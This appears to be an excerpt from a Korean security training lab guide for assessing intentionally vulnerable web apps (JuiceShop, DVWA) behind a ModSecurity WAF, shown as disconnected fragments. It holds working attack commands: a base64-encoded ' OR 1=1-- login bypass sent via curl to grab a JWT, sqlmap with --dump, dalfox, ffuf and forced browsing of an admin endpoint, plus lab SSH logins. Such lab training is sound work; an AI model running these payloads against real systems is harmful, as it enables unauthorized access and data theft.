...
컨테이너(`외부 공격자 VM 192.168.0.202`, 출처 IP `192.168.0.202`)가 fw 의 게이트웨이(`192.168.0.161`)를 통해, HTTP `Host`
...
> 이면 JuiceShop, `Host: dvwa.el34.lab` 이면 DVWA 로 라우팅된다. 그래서 모든 점검 명령은 요청의 `Host: ...`
> 헤더로 표적을 명시한다.
...
방식으로 한다. 본 시험의 명령들이 화면이 아니라 whatweb/ffuf/sqlmap/dalfox 로 API 엔드포인트를 직접 두드리는 이유다.
...
```mermaid
graph TD
    ATK["점검자 외부 공격자 VM<br/>192.168.0.202<br/>whatweb/ffuf/sqlmap (juice.el34.lab)"]
...
ModSecurity audit 에 점검자의 **진짜 출처 IP `192.168.0.202`** 가 그대로 남는다. 그래서 미션 7 에서 WAF
...
호스트(`ssh ccc@192.168.0.80`, 비밀번호 1)에서 `ssh att@192.168.0.202`(점검) 또는 `ssh ccc@10.20.32.80`(방어 측
WAF/로그 확인)으로 실행한다. 점검의 주력 도구는 목적별로 나뉜다 — 핑거프린팅/도달성·강제 브라우징은 **`whatweb`**,
HTTP 메서드 열거는 **`nmap --script http-methods`**, 디렉터리/객체 열거는 **`ffuf`**, SQLi 는 **`sqlmap`**,
XSS 는 **`dalfox`** 다(모두 att `192.168.0.202` 에 설치됨).

> **용어 — whatweb.** URL 하나로 응답 상태코드(`[200 OK]`/`[401 Unauthorized]`)·서버 배너·프레임워크·타이틀을
> 한 번에 식별하는 웹 핑거프린팅 스캐너다. `-a1` 은 공격성(aggression) 레벨 1(stealthy, 최소 요청). 상태코드가
> 대괄호로 그대로 찍혀(`[200 OK]`) 도달성·노출(200)·보호(401/403)를 빠르게 판정할 때 쓴다. att 의 `/etc/hosts`
> 가 `*.el34.lab → 192.168.0.161` 이라 vhost 이름으로 표적을 지정한다.

### 4.1 정찰 (HTTP 메서드 · 정보 노출)

```bash
# 허용 메서드 열거(nmap http-methods) + /ftp 정보 노출(whatweb)
nmap -p80 --script http-methods juice.el34.lab
whatweb -a1 http://juice.el34.lab/ftp
```

무엇을 보나 — nmap 의 `Supported Methods: GET HEAD POST OPTIONS` 와 /ftp 의 `[200 OK] Title[listing directory /ftp]`. 표적의 표면 지도를 그린다.

### 4.2 인증 우회 + JWT (로그인 SQLi)

```bash
# ' OR 1=1-- 로 로그인 우회 → JWT 획득
echo eyJlbWFpbCI6IicgT1IgMT0xLS0iLCJwYXNzd29yZCI6IngifQo= | base64 -d > /tmp/wv8.json; curl -s -H "Content-Type: application/json" -d @/tmp/wv8.json http://juice.el34.lab/rest/user/login | head -c 100; rm -f /tmp/wv8.json  # curl-ok: SQLi 로그인 우회 POST(크래프티드 JSON 바디, 스캐너 대체불가)
```
...
무엇을 보나 — DVWA(차단 모드)에서 sqlmap 은 `protection mechanism (e.g. WAF)`·`403 (Forbidden) - 887 times`,
dalfox 는 `WAF Unknown (HTTP 403) detected` 로 SQLi(942)·XSS(941)가 WAF 에 막힘을 보고한다. 같은 입력을
JuiceShop(탐지만)에 보내면 sqlmap 이 injectable(`back-end DBMS: SQLite`)로 판정하고 `--dump` 로 실데이터까지 뽑힌다.

### 4.4 접근제어 (무인증 관리 · 강제 브라우징)

```bash
whatweb -a1 http://juice.el34.lab/rest/admin/application-configuration
```

무엇을 보나 — 무인증 관리 엔드포인트가 **`[200 OK]`** 로 설정을 노출하는지(A01). whatweb 가 그 안의
`Email[donotreply@owasp-juice.shop]` 까지 파싱하면 노출 확정. `/ftp` 강제 브라우징도 200 이면 접근제어 실패의 또 다른 증거다.

### 4.5 방어 측 확인 (WAF / ModSecurity CRS)

```bash
ssh ccc@10.20.32.80 'sudo tail -200 /var/log/apache2/modsec_audit.log | grep -oE "9[0-9]{5}" | sort -u | head'
```
...
```mermaid
graph TD
    REQ["한 번의 점검 요청<br/>출처 192.168.0.202<br/>SQLi: ' UNION SELECT ...'"]
...
같은 출처 IP(`192.168.0.202`)가 두 관점을 한 사건으로 묶는다는 점은 secuops/soc 트랙의 상관 분석과도
이어진다.
...
> 외부 공격자 VM 192.168.0.202`(또는 방어 확인 시 `el34-web`)로. 각 미션은 **독립적**이며, **인가된 표적(JuiceShop/
